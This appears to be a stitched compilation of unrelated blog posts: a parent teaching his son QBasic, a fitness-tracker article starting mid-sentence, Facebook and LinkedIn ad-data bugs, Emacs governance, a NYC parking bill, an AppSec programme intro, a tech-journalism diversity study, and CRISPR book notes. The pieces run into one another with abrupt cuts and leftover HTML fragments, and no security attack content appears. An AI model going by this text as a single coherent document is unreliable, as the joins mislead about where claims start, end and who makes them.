<p><span>My oldest son Noah turned 7 three months ago. If he could trade his family for a 2 hour session of playing minecraft, he would do it in a heartbeat. The other love of his life is Super Mario Maker, and&nbsp;it’s been a thrill to see him play the same game and levels that I played when I was his age. About 5 months ago, I left my family for my yearly pilgrimage of <a href="http://ludumdare.com/compo/">ludum dare</a>: a game dev competition during which I lock myself away with friends, return to a&nbsp;state of primitive caveman, not sleep for 48h, and create&nbsp;a full game from scratch (play it at the end of this post!) As I proudly showed my revolutionary AAA title to my wife, Noah was naturally intrigued and I introduced him to the world of code, showing him how simple&nbsp;words&nbsp;(he had just learned how to read) produced an actual game. Since&nbsp;that very day, Noah&nbsp;has been asking me repeatedly to teach him how to make&nbsp;his own video games. And for the past 5 months, I have been looking for the holy grail of language/IDE for kids in the hope of turning that spark of interest into a memorable experience…</span></p>
<p><span>My quest has led me to&nbsp;endless forums, through which I have tried countless suggestions: SmallBasic, Pico-8, Smalltalk, Scratch, etc. I have even inquired of the Great&nbsp;Oracles of StackOverflow,&nbsp;to&nbsp;no avail. After 5 months,&nbsp;I&nbsp;ended up with a disappointing conclusion: nothing is even close to what I had back in another era. 30 years later, QBasic is still the best when it comes to&nbsp;discovering programming.&nbsp;</span></p>
<blockquote>
<p><span>“OMG please don’t teach him GOTOs!!”</span></p>
</blockquote>
<pre><code>10 PRINT “OH NO, WHAT ARE YOU DOING?!!!”
20 GOTO 10</code></pre>
<p><span>Yes, QBasic is a terrible procedural language. It introduces one to concepts widely considered harmful, uses awkward syntax for implicit declarations, is not case sensitive, is non-zero-based, etc. the list goes on… When developing a skill, it is much better to acquire the right reflexes from the start rather than have to correct years of bad practice. Following this advice, I should have probably started off with&nbsp;the basics of the ruby language which I love. Yet, while most of those QBasic concepts are today generally considered&nbsp;as red flags by our peers, they each served a very specific&nbsp;purpose at the time: to keep the language simple and accessible, a notion that every other language has left behind in favor of flexibility, complexity and logic.</span></p>
<p><span>I installed QBasic on my son’s 11” HP Stream today, having to hack a DOSBox manual installation. He double clicked the icon on his desktop and in a split second, we were in the IDE, greeted with the introduction screen which brought back so many memories to my mind:</span></p>
<p><img src="https://upload.wikimedia.org/wikipedia/en/0/01/QBasic_Opening_Screen.png" alt="" width="640" height="400"></p>
<p><span>I then told Noah that there was a very sacred ritual, mandatory&nbsp;for anyone who enters the secret&nbsp;inner&nbsp;circle of programmers, to start off with a program that greets every other programmer out there. As I dictated the formula, he slowly&nbsp;searched for each&nbsp;key, carefully&nbsp;typing with his right finger&nbsp;the magic words: <code>PRINT “hello world”</code></span></p>
<p><span>He pressed F5 and looked amazed as he saw his code being compiled into text rendered on his black screen. He smiled, gave me a high-five, and then scribbled down the code in his little notebook so that he could remember later.</span></p>
<p><img src="http://nicolasbize.com/blog/images/noah_1.jpg" alt="" width="800" height="600"></p>
<p>We went on to a couple more commands: CLS, COLOR, PLAY, INPUT, and IF. There was nothing to explain: no complexity, no awkward operator, no abstract concepts, no documentation that needed to be read, no notion of objects/class/methods, no framework to install, no overwhelming menu/buttons in the IDE, no special keyword or parenthesis. It was code in its purest simplicity and form.</p>
<p><span>After less than an hour, he wrote his first program on his own – an interactive and incredibly subtle application which lets you know the computer’s feelings towards&nbsp;you as an individual and sensible human being:</span></p>
<p><img src="http://nicolasbize.com/blog/images/noah_3.jpg" alt="" width="800" height="600"></p>
<p><span>…which he ran with utmost pride for his cousin and best friend Christian:</span></p>
<p><img src="http://nicolasbize.com/blog/images/noah_4.jpg" alt="" width="800" height="600"></p>
<p><span>…after which he proceeded to easily explain him&nbsp;</span><span><b>how</b></span><span>&nbsp;it worked and what the code was doing!</span></p>
<p><img src="http://nicolasbize.com/blog/images/noah_5.jpg" alt="" width="800" height="600"></p>
<p><span>And so it was that in a single hour, my 7 year old was able to not only write his first text game, but also to experience the fun and thrill that comes from creating, compiling and executing his own little program. Bonus points, it all fit on a single notebook page:</span></p>
<p><img src="http://nicolasbize.com/blog/images/noah_2.jpg" alt="" width="600" height="800"></p>
<p><span>I was so glad that he was able to understand why I keep saying that I have the best job in the world.&nbsp;</span><span>My only regret today was to realize that in more than 30 years, we have not been able to come up with something&nbsp;better for our kids: Qbasic has a limited set of simple keywords (the entire help fits on a single F1 screen and is packed with simple examples!), does not distract the coder with any visual artifacts, has a very confined and cosy dev environment, shows errors as early as possible, compiles and executes the code in a heartbeat with a single key, and is extremely straightforward. &nbsp;We have built more robust and more complex languages/frameworks/IDEs (which are of course necessary for any real-life application), but we have never really made a simpler or more direct access to the thrill of programming than QBasic. Even running QBasic today has become dreadful&nbsp;to the novice that uses&nbsp;a modern Mac/PC/Linux machine, whereas it used to simply require inserting a 3,5” floppy in the A:\ disk drive…</span></p>
<p><span>Enough rant, today is all about the celebration of yet another person who discovered the excitement and beauty of programming!</span></p>
<p><span>Cheers!</span></p>

People love the idea of a new gadget that they “need” to buy, in this case, to get fit, but the question of whether or not these devices actually work is definitely up for debate.</span></p><h3 id="viewer-1n80q"><span><strong>What science is saying</strong> </span></h3><p id="viewer-at776"><span>There have been several studies that have discovered that fitness trackers won't necessarily help you get fit faster than simply doing it on your own.</span></p><p id="viewer-e71cl"><span>In 2016, the <a href="https://jamanetwork.com/journals/jama/article-abstract/2553448" target="_blank" rel="noopener"><u>Journal of the American Medical Association (JAMA)</u></a> published a 2-year study from the University of Pittsburgh, aimed at comparing “technology-enhanced weight loss” (with the use of fitness trackers) to “standard behavioural weight loss” (without trackers).</span></p><p id="viewer-9t0rj"><span>Over 24 months, 470 adults participated in the study (233 in the standard group, 237 in the enhanced group). The results determined that the group using smart trackers didn't lose as much weight as the group without (3.5 kg vs 5.9kg).</span></p><div id="viewer-87lfu"><a href="https://jamanetwork.com/journals/jama/article-abstract/2553448" target="_blank" rel="noopener"><div data-hook="imageViewer"><div role="img"><p><img data-pin-url="https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget" data-pin-media="https://static.wixstatic.com/media/f361a8_6caae631dc4d4a07aaaad9f8cc6fbbef~mv2.png/v1/fit/w_1000%2Ch_958%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/f361a8_6caae631dc4d4a07aaaad9f8cc6fbbef~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></a></div><p id="viewer-50v8p"><span>Later a second study, published in <a href="http://www.thelancet.com/journals/landia/article/PIIS2213-8587(16)30284-4/abstract" target="_blank" rel="noopener"><u>The Lancet Diabetes &amp; Endocrinology</u></a><u>,</u> also showed that trackers didn’t help people move more, or get healthier.</span></p><p id="viewer-428pi"><span>Researchers at Duke-National University of Singapore Medical School challenged 800 workers with a target of 70,000 steps per week for 1 year. One group was given Fitbit Zips and another group Zips plus a cash bonus each week they hit their step goals. The control group got nothing except simple encouragement to walk more!</span></p><h3 id="viewer-3kq62"><span><span>Suggested Articles:</span></span></h3><ul><li id="viewer-3umal"><p><strong>🚄 </strong><a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><strong><u>Hyperloop, the future of travel?</u></strong></a></p></li><li id="viewer-628nt"><p><span>📖 </span><a href="https://www.thedetechtor.com/post/are-e-books-the-perfect-alternative" target="_blank" rel="noopener"><u><strong>Are e-books the perfect alternative?</strong></u></a></p></li><li id="viewer-4vu6m"><p><strong>📱 </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ♻️</strong></p></li></ul><p id="viewer-f7pln"><span>For the first 6 months, the money worked, but the Fitbits alone didn’t.

</span></p><h3 id="viewer-c7o16"><span>How to interpret the results?</span></h3><p id="viewer-fggdn"><span>So both these studies have come back with some pretty negative results, how did this happen?</span></p><p id="viewer-9ceo0"><span>Well according to the lead author on the Pittsburgh study, John Jakicic:</span></p><blockquote id="viewer-8s0cb"><span>“These technologies are focused on physical activity, like taking steps and getting your heart rate up, people would say, 'Oh, I exercised a lot today, now I can eat more.' And they might eat more than they otherwise would have.” </span></blockquote><p id="viewer-drb7s"><span>
This is understandable but surely there must be a reason so many people have invested in smart trackers other than our obsession with wearable tech?</span></p><p id="viewer-rnti"><span>
The point is that these devices will work, for <strong>some people. </strong>That is to say that too many people go and buy these devices hoping they'll motivate them to move more, but this just isn't the case; consumers misperceive what are in fact data trackers as motivational tools.</span></p><blockquote id="viewer-1dp63"><span>
“Fitness trackers are equivalent to a bathroom scale,” says Eric Finkelstein, lead author of the Lancet study. “They’re a measurement tool, not an intervention tool. They tell you something, but don’t give you a strategy for how to change it.”</span></blockquote><h3 id="viewer-4sqnd"><span><strong>Should you still go out and buy one?</strong></span></h3><p id="viewer-fnpda"><span>As I said before, the usefulness of these devices varies from person to person, if you think that receiving a bunch of data about how much you’re moving on a regular basis will motivate to stay active then sure! But if you’re expecting the equivalent of a personal coach on your wrist then think again.</span></p><div id="viewer-ei9pb"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget" data-pin-media="https://static.wixstatic.com/media/nsplsh_71537735584b7455797573~mv2_d_4000_2667_s_4_2.jpg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/nsplsh_71537735584b7455797573~mv2_d_4000_2667_s_4_2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-6ldtr"><span>However, these companies are making efforts to improve the motivation aspect to their devices, like <a href="https://www.thedetechtor.com/post/apple-event-september-2020-everything-you-need-to-know" target="_blank" rel="noopener"><u>Apple’s activity rings</u></a>, or some devices allowing you to compare your data to your friends and family.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>It recently surfaced in a story by <a href="https://www.adexchanger.com/platforms/facebook-conversion-lift-measurement-issue-goes-undetected-for-12-months/">AdExchanger</a> and <a href="https://www.wsj.com/articles/facebooks-latest-error-shakes-advertisers-confidence-11606346927">The Wall Street Journal</a> that Facebook had, for <strong><em>a year</em></strong>, been feeding incorrect data to advertisers paying to display adverts across Facebook's network using their lift conversion tool.</p>
<blockquote>
<p>Specifically, the bug was caused by a data pipeline migration in August of last year that affected the way in which certain impressions were logged into Facebook’s conversion lift systems.</p>
<p>As a result, Facebook undercounted the number of conversions from people who were exposed to impressions on Facebook apps.</p>
<p>In other words, Facebook miscalculated the number of sales that came from people that saw an ad, which is a key ratio necessary to measure incrementality, because it’s used to calculate other metrics, including conversion lift percentage, which is the difference in conversions between the people who did and didn’t see ads during a test.</p>
</blockquote>
<p>In finding and fixing this issue, <em>they also surfaced two other bugs affecting data quality for a period of a few months</em>.</p>
<blockquote>
<p>During Facebook’s investigation into the original bug, it also came across and patched two additional, separate and, it says, “smaller” technical issues that affected conversion-based metrics for some lift tests.</p>
</blockquote>
<p>This follows not long after LinkedIn fessed up to <a href="https://www.wsj.com/articles/linkedin-finds-measurement-errors-that-inflated-video-and-ad-metrics-11605228577">their own measurement fuckup</a> that saw 418,000 advertisers served incorrect data over a period of <strong><em>two years</em></strong>.</p>
<blockquote>
<p>In a blog post, the Microsoft Corp.-owned company said its engineering team found and fixed two measurement issues in its ad products, which led to overreporting of video views and ad impressions on sponsored-content campaigns. The bugs affected more than 418,000 advertisers over the course of more than two years, it said.</p>
</blockquote>
<p>I recently wrote about the <a href="https://www.jacquescorbytuech.com/writing/marketers-addicted-bad-data">problem marketers have with bad data</a> and their inability to recognise and understand the data they're being presented from opaque third parties. Not necessarily through any real fault of their own, I hasten to add.</p>
<p>These most recent examples are particular pernicious. Marketers rely on data from Facebook, LinkedIn and similar to optimise campaigns and to assign limited budget. In both cases, incorrect data could have, and probably <em>did have</em>, a tangible effect on how marketers allocated their budget. This lead to Facebook and LinkedIn directly profiting from these fuck-ups.</p>
<p>I can't say this enough, but marketers without a healthy degree of scepticism are going to fall victim to this more and more frequently. If you let garbage data define your media strategy, you'll get garbage results.</p>
<p>Cheers,</p>

        <h3>RMS Does Not See the Future of Emacs
        </h3>
        
        </p>

    <p>I am an avid <a href="https://emacs.org/">Emacs</a> user. I’m using it right now to compose this post. I use it every single day for everything from work to school to personal notes. Most of my activity on GitHub comes from me tweaking little things in my configuration files. I now have an editor that perfectly fits my hands. Emacs is a big part of my life.</p>
<p>I’m afraid it’s dying.</p>
<p>Richard Stallman, one of the principle creators of Emacs and the head of the GNU Project, has made several choice in the past several months that I consider to be detrimental to the Emacs community and harmful for Emacs' further growth. RMS doesn’t seem to care that much about making Emacs appealing to new users, and I think this is a mistake. Emacs derives its strength from being uniquely customizable and extensible; the more people we get using Emacs, the more good extensions, packages, tutorials, etc. will be available for Emacs. Some of the growth-hostile things include:</p>
<ul>
<li>Shutting down suggestions for making Emacs start with a sensible set of defaults that would make it significantly easier for beginners to get started<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></li>
<li>Purging links to the most popular (and most useful!) Emacs package repositories, Melpa and Marmalade, just because they <em>might</em> contain links to sites with non-free Javascript<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></li>
<li>Ignoring community-driven development and exercising veto rule in cases where I personally think it was unwarranted<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></li>
</ul>
<p>I can appreciate strong leadership; I think for creating most things, having a single leader drive the development of a product gives it focus and direction that otherwise might kill it off. (I think Python is a good example of this at work.) In this case with Emacs, however, I think RMS is badly out of touch and should focus on what we as a community can do to make Emacs more robust so that future generations of programmers will have a strong motivation to use Emacs—a desire to run free software motivates precious few people in their selection of their tools. We should make it more appealing for its features and performance as well.</p>
<p>Some areas where Emacs stands to improve are:</p>
<ul>
<li><strong>Beginner-friendliness</strong> The default Emacs theme looks awful. No computer user used to the comforts of macOS or Windows would want to go near that ugly beast. It should have a pretty-looking theme by default. One idea would be to make it so that a new user can select some pre-built themes.</li>
<li><strong>Performance</strong> There are some exciting things happening with gccemacs on this front. I’m not running that right now, as compiling Emacs master on macOS is a little persnickety. Improving its rendering engine would help too. I recognize that that is a big undertaking, and unfortunately I have little to offer in this regard.</li>
<li><strong>Ease of contribution</strong> Why not host Emacs development on a self-hosted GitLab instance? Or use some other issue tracker? I understand that there are some advantages for mailing lists, but the set of programmers who are a.) familiar with that work flow, and b.) prefer it, is dwindling. An issue/PR-style flow makes a lot more sense for most developers, and I think it would go a long way to enriching community involvement in Emacs' core development.</li>
</ul>
<p>These are just my thoughts, and will likely evolve over time. Unfortunately I cannot devote as much time as I would like to improving Emacs, though I do enjoy <a href="https://github.com/ashton314/gilded-select">learning to write packages</a> when I have the time.</p>
<p>Good luck, all you Emacs maintainers out there. You’re heroes.</p>

<p>New York City residents could make money by reporting illegally parked cars and then collecting part of the resulting fines under a proposal introduced last week.</p><p>The <a href="https://legistar.council.nyc.gov/LegislationDetail.aspx?ID=4699482&amp;GUID=0D2AA2FF-6328-4781-ABF1-8D789CB876A8&amp;Options=Advanced&amp;Search=" target="_blank">bill</a>, sponsored by City Councilmembers Stephen Levin and Corey D. Johnson, would give parking whistleblowers 25% of any fines resulting from reports of cars that obstruct bike or bus lanes, sidewalks, crosswalks or fire hydrants located near schools. Not every car would be subject to the policy—only those parked illegally within a “radial distance” of 1,320 feet of a school building, entrance or exit.&nbsp;</p><p>The proposal would also increase the fines for those cars, from $115 to $175. Cars with city-issued parking placards—typically given to police officers and other city employees—would not be exempt, which Johnson, the council speaker, said was designed to crack down on their unauthorized use.</p><p>“Placard abuse remains a scourge on our city streets despite repeated efforts to bring it to an end,” he wrote <a href="https://twitter.com/NYCSpeakerCoJo/status/1329532664630693890" target="_blank">on Twitter</a>. “This new bill would give New Yorkers the power to end placard abuse through real-time crowdsourced reporting and appropriately harsh penalties.”</p><p>The proposed program would be modeled after an existing tool that allows residents to submit reports of <a href="https://www1.nyc.gov/site/dep/environment/idling-citizens-air-complaint-program.page" target="_blank">idling cars</a> via an online portal. The parking initiative would use a similar, but separate, portal that would be overseen by the Department of Transportation, which would establish rules for the process, including the type of evidence required to follow up on a complaint. Cases that proceed would be heard before the city’s Office of Administrative Trials and Hearings.</p><p>Levin said the bill was not designed to increase revenue for the city—just to make streets safer for pedestrians and cyclists.</p><p>“It’s not for all parking violations, just for the dangerous ones—parking in bike lanes, bus lanes, sidewalks and crosswalks,” he wrote <a href="https://twitter.com/StephenLevin33/status/1331041372183392256" target="_blank">on Twitter</a>. “People die going into traffic avoiding cars doing this. Unfortunately, police don’t usually enforce.”</p><p>The proposal, referred to the council’s transportation committee, is the latest in a long line of initiatives meant to crack down on illegal use of parking placards. A three-strikes policy implemented by Mayor Bill de Blasio revoked <a href="https://nypost.com/2020/09/14/de-blasios-three-strikes-policy-nails-two-parking-placard-abusers/" target="_blank">just two permits</a> in 19 months, while a separate police department team issued 2,444 summonses for fraudulent use of a parking permit in its first year—the equivalent of “fewer than seven tickets a day across the entire city,” <a href="https://nyc.streetsblog.org/2020/08/11/the-nypds-non-existent-placard-crackdown-by-the-astonishingly-low-numbers/" target="_blank">Streetsblog reported</a>.<svg>

<h3 id="this-is-part-of-a-series">This is part of a series</h3>
<ul>
<li>Introduction (you are here)</li>
<li><a href="https://rethinksecurity.io/posts/phase-one-of-appsec-engineering-awareness/">Awareness</a></li>
<li>Enablement (coming soon)</li>
<li>Enforcement (coming soon)</li>
</ul>
<p>In order for an AppSec team to collaborate effectively with development teams they should think in three phases: <a href="https://rethinksecurity.io/posts/phase-one-of-appsec-engineering-awareness/">Awareness</a>, Enablement, and Enforcement. This month I’ll be dedicating an article to each. The focus of these articles will be on the critically important area of application security, focused on the roles involved in building software: developers (DevOps), testers, and architects.</p>
<p><strong>Awareness</strong> training arms your team to understand how important security is and when to raise their hand for security support. Application security awareness can start with a series of talks, but the best awareness is hands on training. Getting the team to find, fix, or discuss vulnerabilities and threat scenarios is critical in giving them the awareness of when to think about security. The goals of this training isn’t to give the team the ability to find or fix vulnerabilities yet, it is to build a sense of impact and risk. A successful awareness program will provide experiences to draw from that will pop into their heads as they build or test. You want them to be able to recognize when to say “Wait, this has security implications. I’d better reach out to the security team!”</p>
<p><a href="https://rethinksecurity.io/posts/phase-one-of-appsec-engineering-awareness/">Read the complete article on Awareness here</a></p>
<p><strong>Enablement</strong> makes security easier for your team through automation and expert knowledge. Your security team needs to build the trust of the rest of the organization and make improvements to their processes by understanding their pain points and then solving them in ways that are easy to accept and adopt. This may mean instrumenting part of the Dev/Sec/Ops pipeline, building out better libraries, frameworks or defaults, building security unit tests, or to enable the testers to perform security testing alongside the rest of their test suite. The most important part of this phase is to help build software, not slow it down. The security team doesn’t exist to enforce its will on the rest of the company, but to enable them to meet their objectives. I call this “falling into a pit of success”. Make doing the secure thing easier than the insecure one.</p>
<p><strong>Enforcement</strong> is the backstop to security. This is defense in depth. Traditionally this is where most security programs start, but to be effective security teams need to win hearts and minds far, far earlier. In a mature model most security activities are performed and issues are found before the security team gets their hands on the software. Enforcement exists to double check procedures have been followed and to catch issues that slip through the cracks. This is also often where audit, compliance, regulatory checks can be performed.</p>
<p>Sometimes security teams will feel as if they are the last bastion fighting against the dev team who is ready to deploy insecure software to get features out. However, we are all in the business of building secure software and building trust with our customers. Every person at your company is trying to balance the many facets to quality software as best they can. Understanding how security fits into your overall process and how to build secure software without slowing development and deployment down is critical to the success of any company. A cooperative model will always be more effective than an adversarial one.</p>

<p>As of 2020, the percentage of white employees at Facebook is <a href="https://diversity.fb.com/read-report/">41%.</a> At Google, <a href="https://kstatic.googleusercontent.com/files/25badfc6b6d1b33f3b87372ff7545d79261520d821e6ee9a82c4ab2de42a01216be2156bc5a60ae3337ffe7176d90b8b2b3000891ac6e516a650ecebf0e3f866">51.7%</a>. At Microsoft, <a href="https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE4aqv1">53.2%</a>. At Amazon, <a href="https://www.aboutamazon.com/working-at-amazon/diversity-and-inclusion/our-workforce-data">34.7%</a>. At Apple, <a href="https://www.apple.com/diversity/">50%</a>. <strong>The workforce of the big five tech companies is thus less than 50% white</strong>, if we weight each company equally.</p>
<p>Note that a population-weighted average across companies would bring the percentage white number down further given the size of Amazon. Moreover, while it’s true that Amazon’s workforce includes many blue collar employees,even if we restrict to white collar employees only (or just look at the other four big tech companies) the numbers cluster in the same range.</p>
<p>For most tech media corporations, we lack diversity reports, so we did two different kinds of analyses (subjective and algorithmic) on two different kinds of datasets (search-based and curated).</p>
<ul>
<li><p>Specifically, we first collected a list of 982 tech journalists from Twitter, attempting to be comprehensive (details below). The subjective approach to estimating race and gender resulted in an figure of 80% white for this “search-based” dataset.</p></li>
<li><p>When we ran an alternative algorithmic approach to estimating race and gender on this same search-based dataset, we obtained an estimate of 77% white.</p></li>
<li><p>And when we re-ran the algorithmic approach on an independently curated dataset of tech journalists we obtained an estimate of 84% white.</p></li>
</ul>
<p>The tightness of these different estimates for tech journalism should inspire some confidence in their accuracy. <strong>The overall estimate is that tech journalism is 77-84% white</strong>.</p>
<p>Thus, tech journalism is considerably less racially diverse than tech. And when we repeat these analyses for gender, we find that tech and tech journalism are very similar.</p>
</div><div id="background-and-overview-of-the-methodology">
<h2>Background and overview of the methodology</h2>
<p>Oo Nwoye (<a href="https://twitter.com/OoTheNigerian">@OoTheNigerian</a>) wrote an initial <a href="https://oonwoye.com/2020/07/15/big-tech-media-colluding/">blog post</a> on this topic in early July 2020. The initial dataset focused on the diversity of editorial staff and attendees at tech-journalism conferences, but this approach had two limitations. First, conferences are subject to a variety of selection biases. Second, there are only so many people on editorial staff or in the tech-journalism conference circuit.</p>
<p>Here we pursue a different approach, using multiple methods to check the robustness of our results.</p>
<div id="two-different-datasets-search-based-and-curated">
<h3>Two different datasets: search-based and curated</h3>
<p>We use two different sampling methods to make sure our results are not sensitive to how the set of “tech journalists” is defined. This gave us two different datasets.</p>
<p>In the search-based method, we collected lists of individuals on Twitter whose bios indicate current or past work for any one of 13 major tech-journalism outlets (namely Verge, Gigaom, Cnet, Wired, Engadget, The Information, Recode, The Next Web, Venture Beat, TechRadar, TechCrunch, Gizmodo, and Motherboard). We added tech journalists from the New York Times with a slightly different method (detailed below) as most of the NYT isn’t devoted full time to just tech coverage. If you want to extend our analysis, this method can be generalized to the Wall Street Journal, Washington Post, the Economist, and other general interest publications that include a significant amount of tech coverage.</p>
<p>In the curated method, we gathered a dataset of tech journalists by combining two publicly available, third-party-curated lists (<a href="https://twitter.com/i/lists/96162061">1</a>, <a href="https://twitter.com/i/lists/53301954">2</a>) called “Tech Journalists.” We had no role in the curation of these lists, so if the results of our diversity analysis are similar when conducted on this sample as well, we should be more confident that our analyses accurately reflect the true state of tech journalism on Twitter.</p>
</div>
<div id="two-ways-of-estimating-race-and-gender">
<h3>Two ways of estimating race and gender</h3>
<p>Estimating race and gender can be tricky. An algorithmic method may fail to capture important nuances in how race and gender are socially constructed. A method based on subjective human judgment might err by being inconsistent about how race and gender are assigned. To deal with the limitations of each method, we estimate race and gender through <em>both</em> methods. If the results are similar, we should be relatively confident in their accuracy.</p>
<p><em>Subjective method</em>. Estimating race and gender through subjective human judgment was our first approach. We looked at each Twitter account and inferred the individual’s race and gender holistically, using their profile photo, name, and bio. In cases where either the gender or race was unclear using a subjective approach, we assigned an “NA” for the given variable. Given some controversy over the race of Arab and Persian people (the US census says “white” but many people have <a href="https://www.latimes.com/projects/la-me-census-middle-east-north-africa-race/">contested</a> this), we sidestep the matter by assigning people of Arab and Persian descent “NA” for race. This affected only about 15 people, so neither classification would have a large effect on our key findings.</p>
<p><em>Algorithmic method</em>. As a second method, we leveraged data from the Census and the Social Security Administration to infer journalist’s race and gender from surnames and first names, respectively.</p>
</div>
<div id="note-on-using-twitter-data">
<h3>Note on using Twitter data</h3>
<p>Let’s discuss a few limitations of the approach of using Twitter-based samples to analyze tech journalism. First, it’s possible some tech journalists are not on Twitter. A second limitation is that a tech journalist may be on Twitter but not pulled up by the search algorithm. Third, we restricted our search to 13 tech publications and one general interest publication (the New York Times) that has significant tech coverage.</p>
<p>The main impact of these issues is that our sample will not capture every tech journalist on Twitter. Nonetheless, it should capture most of the writers at tech-focused publications, which means it should generalize.</p>
</div>
<div id="note-on-inferring-race-and-gender-from-names">
<h3>Note on inferring race and gender from names</h3>
<p>In estimating race from surnames, the most serious problem is due to the history of anti-black racism and slavery in the United States. Because of slavery in the United States, black people in America today frequently have European-origin last names (such as Williams or Washington). Therefore, inferring race from surnames will generally under-count black people. As you’ll see below, we take some extra steps to mitigate this problem (see comments inside the code snippets), but the results of any automated measurement method will always have some amount of error. A similar issue is present for gender estimation. We believe this problem is offset by using subjective assignment as an independent check.</p>
</div>
<div id="note-on-code">
<h3>Note on code</h3>
<p>This code in this study is research-grade. It works and we’ve double checked the numbers, but it has a fair bit of copy/paste when it comes to the graphs. To be clear, you should be able to reproduce everything from the code below, but if there’s interest in a cleaned up version we may provide it. Fill out <a href="https://forms.gle/waQXLz6C8Jpc81EDA">this</a> if you’re interested.</p>
</div>
</div><div id="dataset-1-twitter-search-for-journalists-with-major-tech-outlets-in-their-bio">
<h2>Dataset 1: Twitter search for journalists with major tech outlets in their bio</h2>
<p>We used the R package <em>rtweet</em> to search for anyone on Twitter who mentions one of 12 journalism-related keywords (reporter, journalist, producer, designer, editor, writer, analyst, current, former, bylines, columnist, freelance) and one of 13 dedicated tech-journalism outlets in their bio (Verge, Gigaom, Cnet, Wired, Engadget, The Information, Recode, The Next Web, Venture Beat, TechRadar, TechCrunch, Gizmodo, and Motherboard). The Twitter API allows for up to 1,000 results per search.</p>
<p>Because the New York Times is not a dedicated tech publication, we used a different method. We first gathered names by searching for people on Twitter with “tech” and “nytimes” (the Twitter username of the NYT), and then we manually gathered the Twitter usernames of every author listed in <a href="https://www.nytimes.com/section/technology">the Technology section</a> in the month of July.</p>

<p><strong>A Crack in Creation: Gene Editing and Unthinkable power to control evolution</strong>
by Jennifer Doudna and Samuel Steinberg is a book on gene-editing and a
technology called CRISPR.</p>
<p>The book is a personal narration of Jennifer Doudna as she explains the
development of CRISPR and it's discovery for use in gene editing.  Rather than a
review, this are notes while reading this book.  CRISPR is molecular structure
found in Bacteria, but now more popular term, commonly associated with a gene
editing technique.</p>
<p><em>Given the technical nature of this article, I must have used the text from the
sources only with slight modification for explanation. References should give
the materials I consulted to write this post. In you notice technical
inaccuracy, I aplogize, please point out, and I will correct it.</em></p>
<p><strong>Terms</strong></p>
<p>As I reader, I found reviewing biological terms helped me understand the
material better.</p>
<div>
<p><img alt="https://dl.dropbox.com/s/3cn83qir2ip3nso/Screenshot_2020-11-28-04-50.png" src="https://dl.dropbox.com/s/3cn83qir2ip3nso/Screenshot_2020-11-28-04-50.png"></p><p>DNA, the language of life. Figure from <em>A Crack in Creation</em> book.</p>
</div>
<p>Human Body is made of <strong>cells</strong>, in-fact trillions of cells. Each of these cells
contain something called DNA. <strong>DNA</strong> is like recipe, just like a food recipe,
but for building and maintaining living organisms.</p>
<p>Cells use DNA to make proteins. Proteins are the workhorses of the body, they do
all the stuff we need to do to survive, from digesting food to making other
proteins.  Proteins are molecules made up of cells.</p>
<p>DNA is made up of a long combination of some very basic organic components
called Adenine, Thymine, Guanine and Cytosine. Human DNA consists of about 3
billion of these. The sequence of these determines the information available for
building and maintaining an organism, similar to the way in which letters of the
alphabet appear in a certain order to form words and sentences.</p>
<p>In the nucleus of each cell, the DNA molecule is packaged into thread-like
structure called <strong>chromosomes</strong>. A <em>Chromosome</em> is a DNA containing structure.</p>
<p>RNA are like cousins of DNA, which has an oxygen atom with it. One type called
messager RNA, mRNA, act as carrier of information to different cells, carrying
information from DNA to those cells to produce proteins.</p>
<p>So far, in above definitions, we didn't emphasize on <em>heredity</em> , that is,
sending information from parent to child yet. As soon as we start talking about
<em>heredity</em>, we use the term, <strong>Genes</strong>.</p>
<p>A gene is the basic physical and functional unit of heredity. Each chromosome of
human body has many genes.</p>
<p>If we take a single cell from human body, and find out the entire set of
<em>genetic information</em> in the chromosomes of that cell, we call that a
<strong>Genome</strong>. A Genome, from <strong>Gen</strong> e and Chromos <strong>ome</strong>, is the entire set of
<em>genetic</em> instructions found inside a cell.</p>
<p><strong>CRISPR in bacteria</strong></p>
<p>Single celled organisms like Bacteria were using a technique to fight off some
diseases.  The term CRISPR was given to an identified characteristic in
Bacterial DNA sequence, which was used to produce a protein called CAS-9, which
in turn, helped to kill the enemy virus.</p>
<p>CRISPR stands for Clustered Regularly Interspaced Short Palindromic Repeats and
is a family of DNA Sequences found in genomes of bacteria. CAS9 stands for
CRISPR associated protein 9.</p>
<p>The bacteria were found to capture snippets of DNA from invading viruses and use
them to create DNA segments known as CRISPR arrays. The CRISPR arrays allow the
bacteria to "remember" the viruses. If the viruses attack again, the bacteria
produce RNA segments from the CRISPR arrays to target the viruses' DNA. The
bacteria then use Cas9 to cut the DNA apart and kill the virus.</p>
<div>
<p><img alt="https://dl.dropbox.com/s/staumxmyll7ypty/Screenshot_2020-11-27-19-41.png" src="https://dl.dropbox.com/s/staumxmyll7ypty/Screenshot_2020-11-27-19-41.png"></p><p>CRISPR in Bacteria. Figure from <em>Crack in the Creation</em>.</p>
</div>
<p><strong>CRISPR Shaping Human Genome</strong></p>
<p>The CRISPR-Cas9 system works similarly in the lab. Researchers create a small
piece of RNA with a short "guide" sequence that attaches (binds) to a specific
target sequence of DNA in a genome. The RNA also binds to the Cas9 enzyme. As in
bacteria, the modified RNA is used to recognize the DNA sequence, and the Cas9
enzyme cuts the DNA at the targeted location. Although Cas9 is the enzyme that
is used most often, other enzymes (for example Cpf1) can also be used. Once the
DNA is cut, researchers use the cell's own DNA repair machinery to add or delete
pieces of genetic material, or to make changes to the DNA by replacing an
existing segment with a customized DNA sequence</p>
